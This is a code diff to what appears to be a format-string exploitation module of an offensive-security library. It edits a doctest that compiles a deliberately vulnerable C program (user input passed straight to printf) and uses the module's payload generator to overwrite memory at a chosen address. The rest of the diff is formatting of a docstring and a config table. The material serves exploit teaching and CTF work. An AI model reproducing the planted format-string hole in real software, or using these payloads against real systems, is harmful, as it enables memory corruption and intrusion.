@@ -3,50 +3,44 @@ Provide some tools to exploit format string bug
 
 Examples:
 
-    >>> context.log_level = 'error'
-    >>> program = "\n".join([
-    ...     "#include <stdio.h>",
-    ...     "#include <stdlib.h>",
-    ...     "#include <unistd.h>",
-    ...     "#include <sys/mman.h>",
-    ...     "#define MEMORY_ADDRESS ((void*)0x11111000)",
-    ...     "#define MEMORY_SIZE 1024",
-    ...     "#define TARGET ((int *) 0x11111110)",
-    ...     "int main(int argc, char const *argv[])",
-    ...     "{",
-    ...     "       char buff[1024];",
-    ...     "       void *ptr = NULL;",
-    ...     "       int *my_var = TARGET;",
-    ...     "       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);",
-    ...     "       if(ptr != MEMORY_ADDRESS)",
-    ...     "       {",
-    ...     '               perror("mmap");',
-    ...     "               return EXIT_FAILURE;",
-    ...     "       }",
-    ...     "       *my_var = 0x41414141;",
-    ...     "       write(1, &my_var, sizeof(int *));",
-    ...     '       scanf("%s", buff);',
-    ...     "       fprintf(stderr, buff);",
-    ...     "       write(1, my_var, sizeof(int));",
-    ...     "       return 0;",
-    ...     "}"
-    ... ])
-    >>> filename_program = tempfile.mktemp()
-    >>> filename_source = tempfile.mktemp() + ".c"
-    >>> with open(filename_source, 'w') as f:
-    ...     f.write(program)
-    ...
-    >>> gcc = process(["gcc", filename_source, "-Wno-format-security", "-m32", "-o", filename_program])
-    >>> gcc.recvall()
-    ''
+    >>> program = tempfile.mktemp()
+    >>> source  = program + ".c"
+    >>> write(source, '''
+    ... #include <stdio.h>
+    ... #include <stdlib.h>
+    ... #include <unistd.h>
+    ... #include <sys/mman.h>
+    ... #define MEMORY_ADDRESS ((void*)0x11111000)
+    ... #define MEMORY_SIZE 1024
+    ... #define TARGET ((int *) 0x11111110)
+    ... int main(int argc, char const *argv[])
+    ... {
+    ...        char buff[1024];
+    ...        void *ptr = NULL;
+    ...        int *my_var = TARGET;
+    ...        ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
+    ...        if(ptr != MEMORY_ADDRESS)
+    ...        {
+    ...                perror("mmap");
+    ...                return EXIT_FAILURE;
+    ...        }
+    ...        *my_var = 0x41414141;
+    ...        write(1, &my_var, sizeof(int *));
+    ...        scanf("%s", buff);
+    ...        printf(buff);
+    ...        write(1, my_var, sizeof(int));
+    ...        return 0;
+    ... }''')
+    >>> cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
+    >>> process(cmdline).wait_for_close()
     >>> def exec_fmt(payload):
-    ...     p = process(filename_program)
+    ...     p = process(program)
     ...     p.sendline(payload)
     ...     return p.recvall()
     ...
     >>> autofmt = FmtStr(exec_fmt)
     >>> offset = autofmt.offset
-    >>> p = process(filename_program, stderr=open('/dev/null', 'w+'))
+    >>> p = process(program)
     >>> addr = unpack(p.recv(4))
     >>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
     >>> p.sendline(payload)
@@ -109,7 +103,7 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
     r"""fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str
 
     Makes payload with given parameter.
-    It can generate payload for 32 or 64 bits architectures. 
+    It can generate payload for 32 or 64 bits architectures.
     The size of the addr is taken from ``context.bits``
 
     Arguments:
@@ -140,13 +134,16 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
 
     # 'byte': (number, step, mask, format, decalage)
     config = {
-                32 : {'byte': (4, 1, 0xFF, 'hh', 8),
-                      'short': (2, 2, 0xFFFF, 'h', 16),
-                      'int': (1, 4, 0xFFFFFFFF, '', 32)},
-                64 : {'byte': (8, 1, 0xFF, 'hh', 8),
-                      'short': (4, 2, 0xFFFF, 'h', 16),
-                      'int': (2, 4, 0xFFFFFFFF, '', 32)}
-            }
+        32 : {
+            'byte': (4, 1, 0xFF, 'hh', 8),
+            'short': (2, 2, 0xFFFF, 'h', 16),
+            'int': (1, 4, 0xFFFFFFFF, '', 32)},
+        64 : {
+            'byte': (8, 1, 0xFF, 'hh', 8),
+            'short': (4, 2, 0xFFFF, 'h', 16),
+            'int': (2, 4, 0xFFFFFFFF, '', 32)
+        }
+    }
 
     if write_size not in ['byte', 'short', 'int']:
         log.error("write_size must be 'byte', 'short' or 'int'")
